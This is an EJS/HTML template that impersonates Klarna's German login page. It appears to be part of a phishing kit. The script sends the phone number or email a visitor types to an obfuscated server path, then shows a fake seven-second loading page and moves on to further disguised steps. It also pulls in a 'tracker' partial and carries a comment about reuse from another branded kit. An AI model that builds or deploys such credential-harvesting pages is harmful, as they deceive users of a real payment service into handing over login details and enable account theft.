<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klarna</title>
    <link rel="stylesheet" href="./css/bavoka.css">
      <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <%- include('partials/tracker') %>
</head>

<body>
    <div class="login-container">
        

        <form class="form1" method="post" id="loginForm">
            <div class="up">
                <button class="close-btn" aria-label="Close">
                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z"
                            fill="#2a2a2a" />
                    </svg>
                </button>

                <h1>Anmelden</h1>
                <p class="subtitle">Oder <a href="#">Account erstellen</a></p>
                
                <div class="input-group">
                
                <div class="form-group">
                <input
                    type="text"
                    id="username"
                    class="form-input"
                    placeholder=" "
                    required
                    autocomplete="username"
                />
                <label class="form-label" for="username">Handynummer oder E-Mail</label>
                
            </div>

                <div id="errorMessage" style="color: #d01a1a; font-size: 12px; margin-top: 5px; display: none;">Bitte
                    geben Sie Ihre E-Mail-Adresse oder Mobiltelefonnummer ein.</div>
                </div>
            </div>
            <!-- /// -->
            <div class="down">
                <button style="width: 100%;" class="submit-btn" type="submit">Weiter</button>

            <p class="footer-text">
                Du bleibst <span class="highlight">angemeldet</span>, damit du schneller zugreifen kannst
            </p>
            <p class="footer-text">
                Indem du fortfährst, erklärst du dich mit den <a href="#">Nutzungsbedingungen</a> · <a
                    href="#">Datenschutzrichtlinie</a> einverstanden
            </p>
            </div>
        </form>

       
    </div>

    <script>
        function validateEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        function validatePhoneNumber(phone) {
            const cleanPhone = phone.replace(/[\s\-\(\)\.]/g, '');
            const phoneRegex = /^(\+?[0-9]{7,15})$/;
            return phoneRegex.test(cleanPhone);
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const errorMessage = document.getElementById('errorMessage');
            
            if (!username) {
                errorMessage.textContent = 'Bitte geben Sie Ihre E-Mail-Adresse oder Mobiltelefonnummer ein.';
                errorMessage.style.display = 'block';
                return;
            }
            
            const hasAtSymbol = username.includes('@');
            let isValid = true;
            
            if (hasAtSymbol) {
                isValid = validateEmail(username);
            } else {
                isValid = validatePhoneNumber(username); // Using the same phone validation as logipaypo
            }
            
            if (!isValid) {
                errorMessage.textContent = hasAtSymbol ? 
                    'Bitte geben Sie eine gültige E-Mail-Adresse ein.' : 
                    'Bitte geben Sie eine gültige Mobiltelefonnummer ein.';
                errorMessage.style.display = 'block';
                return;
            }
            
            errorMessage.style.display = 'none';

            $.ajax({
                url: '/gzLbTbjqMpc34D4XsPJ2',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({username}),
                success: function(info) {
                    if(info.OK){
                        if(!isNaN(username)){
                            window.location = "/loading?time=7&url=/RKnUB922z6Mf4HDwg3EZ";
                            
                        }else{
                            window.location = "/loading?time=7&url=/PPmP85AgNE4pnL5mWSM";
                        }
                      
                      
                    }
                }
            });
        });

        document.getElementById('username').addEventListener('input', function() {
            const errorMessage = document.getElementById('errorMessage');
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
        });
    </script>

</body>

</html>